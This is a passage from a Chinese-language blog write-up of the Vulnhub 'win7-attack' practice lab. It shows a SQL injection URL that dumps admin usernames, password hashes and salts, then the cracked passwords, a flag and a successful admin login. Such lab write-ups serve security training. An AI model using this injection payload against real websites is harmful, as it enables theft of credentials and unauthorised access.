id,username,password,password_salt,reg_time,reg_ip,last_login_time,last_login_ip,last_change_pwd_time,status </span>\n\nindex.php?s=/news/<span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">union</span> select <span class=\"hljs-number\">1</span>,group_concat(<span class=\"hljs-string\">' username='</span>,username,<span class=\"hljs-string\">' password='</span>,password,<span class=\"hljs-string\">' salt='</span>,password_salt),<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span>,<span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">7</span> from tpx_admin_user %<span class=\"hljs-number\">23</span>\n<span class=\"hljs-comment\">// 获得数据 username ，password的数据</span>\n<span class=\"hljs-comment\">//   ,username=admin ,password=VFZSSmVrNUVWVEpaYlhneFdsRTlQUT09,salt=XGFnMdiWxf, ,username=admin2 ,password=e10adc3949ba59abbe56e057f20f883e,salt=IQKwyDoYFc, ,username=admin3 ,password=TVRJek5EVTJabmxRWldoS2NFZHhkZz09,salt=fyPehJpGqv, ,username=flag ,password=XTDXANDLDXY,salt=666666 </span>\n</code></pre>\n</li>\n<li>\n<p>破解密码</p>\n<pre><code class=\"hljs language-c\">admin = <span class=\"hljs-number\">123456b</span>lue\nadmin2 = <span class=\"hljs-number\">123456</span>\nadmin3 = <span class=\"hljs-number\">123456f</span>yPehJpGqv\n</code></pre>\n</li>\n</ol>\n<h2>flag</h2>\n<p>sql注入获得flag <code>XTDXANDLDXY</code></p>\n<h2>web渗透-2</h2>\n<ol>\n<li>\n<p>扫描登陆页面 ，<code>admin.php</code></p>\n<pre><code class=\"hljs language-c\">admin = <span class=\"hljs-number\">123456b</span>lue\nadmin2 = <span class=\"hljs-number\">123456</span>\nadmin3 = <span class=\"hljs-number\">123456f</span>yPehJpGqv\n</code></pre>\n<p>均登陆失败</p>\n</li>\n<li>\n<p>得知密码是<code>VFZSSmVrNUVWVEpaYlhneFdsRTlQUT09</code>解码两次的结果<code>MTIzNDU2Ymx1ZQ==</code> ….</p>\n<p>登陆成功</p>\n</li>\n</ol>","title":"Vulnhub - win7-attack","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"win7-attack\n\n by gongli\n \n\n端口扫描主机发现\n\n1. 探测存活主机，`161`是靶机\n    \n    \n    \n2. 探测主机所有开放端口\n    \n    \n    \n3. 探测服务版本以及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n5. 一波操作，web服务器是`IIS 7.5` ，mysql版本是`5.5.11` ,以及..."},"recentPosts":[{"id":"TheHackersLabsFolclore","title":"TheHackersLabs - Folclore","date":"2025-09-24","isEncrypted":false,"year":"2025","month":"09","day":"24"},{"id":"HackMyVMAria","title":"HackMyVM - Aria","date":"2025-09-23","isEncrypted":false,"year":"2025","month":"09","day":"23"},{"id":"HackTheBoxSeason9 - Expressway","title":"HackTheBox - Season9 - Expressway","date":"2025-09-21","isEncrypted":true,"year":"2025","month":"09","day":"21"},{"id":"HackTheBoxSeason8 - Fluffy","title":"HackTheBox - Machine - Fluffy","date":"2025-05-25","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Planning","title":"HackTheBox - Machine - Planning","date":"2025-05-11","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"HackTheBoxMachine - Eureka","title":"HackTheBox - Machine - Eureka","date":"2025-04-28","isEncrypted":false,"year":"2025","month":"09","day":"20"},{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"}]},"__N_SSG":true}